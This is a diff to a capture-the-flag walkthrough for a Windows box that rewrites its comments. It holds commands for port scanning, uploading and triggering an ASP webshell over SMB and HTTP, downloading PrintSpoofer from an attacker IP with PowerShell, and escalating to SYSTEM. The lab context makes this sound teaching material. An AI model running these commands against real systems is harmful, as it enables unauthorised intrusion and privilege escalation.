@@ -43,8 +43,8 @@ user.txt at C:\Users\Bob\Desktop\user.txt
 ## 1. Reconnaissance
 
 ```bash
-# What it does: full port scan with high speed and service detection.
-# Why here: identify all open ports and versions to plan the initial attack.
+# What it does: run an Nmap scan to discover open ports and services.
+# Why here: identify the attack surface, specifically finding the second IIS instance on port 49663.
 nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open -oN silent
 nmap -sVC -p80,135,139,445,3389,49663,49666,49667 $TARGET -oN service
 ```
@@ -131,8 +131,8 @@ smbclient //$TARGET/nt4wrksv -U 'Bob%!P@$$W0rD!123' -c "put shell.asp"
 ### 3c. Trigger over HTTP
 
 ```bash
-# What it does: execute a command through the uploaded ASP shell.
-# Why here: verify that the webshell is functional and can execute system commands.
+# What it does: send an HTTP request to the target web server.
+# Why here: trigger the ASP webshell to execute commands or verify connectivity to the attacker.
 curl "http://$TARGET:49663/nt4wrksv/shell.asp?cmd=whoami"
 # iis apppool\defaultapppool
 ```
@@ -178,8 +178,8 @@ Tools: [netcat](../../tools/pivot/netcat.md), [curl](../../tools/web/curl.md).
 ## 5. User Flag
 
 ```cmd
-REM What it does: execute a Windows command-line action.
-REM Why here: enumerate, transfer, replace or validate artifacts on the victim.
+REM What it does: execute a command in the Windows command prompt.
+REM Why here: check current user context and read the recovered user flag.
 whoami
 type C:\Users\Bob\Desktop\user.txt
 ```
@@ -199,23 +199,21 @@ SNMP Key found at HKLM:\SYSTEM\CurrentControlSet\Services\SNMP
 Name: AWSLiteAgent 
 PathName: C:\Program Files\Amazon\XenTools\LiteAgent.exe
 
-## Tenemos permiso de SeImpersonatePrivilege Impersonate a client after authentication Enabled 
+## Target has SeImpersonatePrivilege enabled.
 ```cmd
-Download PrintSpoofer
-REM What it does: download the PrintSpoofer exploit from the attacker.
-REM Why here: prepare for privilege escalation by leveraging the SeImpersonatePrivilege.
+# What it does: download the PrintSpoofer exploit from the attacker.
+# Why here: prepare for privilege escalation by leveraging the SeImpersonatePrivilege.
 powershell -c "Invoke-WebRequest http://192.168.160.214/PrintSpoofer64.exe -OutFile C:\Windows\Temp\ps.exe"
 
-:: Ejecutar  te da SYSTEM directamente
-REM What it does: execute PrintSpoofer to spawn a SYSTEM shell.
-REM Why here: abuse the SeImpersonate privilege to elevate access to the highest level.
+# What it does: leverage SeImpersonatePrivilege via PrintSpoofer.
+# Why here: escalate privileges from iis apppool to nt authority\system.
 C:\Windows\Temp\ps.exe -i -c cmd
 ```
 
 ## Final access as SYSTEM / Administrator
 ```cmd
-REM What it does: execute a Windows command-line action.
-REM Why here: enumerate, transfer, replace or validate artifacts on the victim.
+REM What it does: execute a command in the Windows command prompt.
+REM Why here: confirm SYSTEM access and capture the final root flag.
 whoami
 ## nt authority\system
 C:\Users\Administrator\Desktop>type root.txt
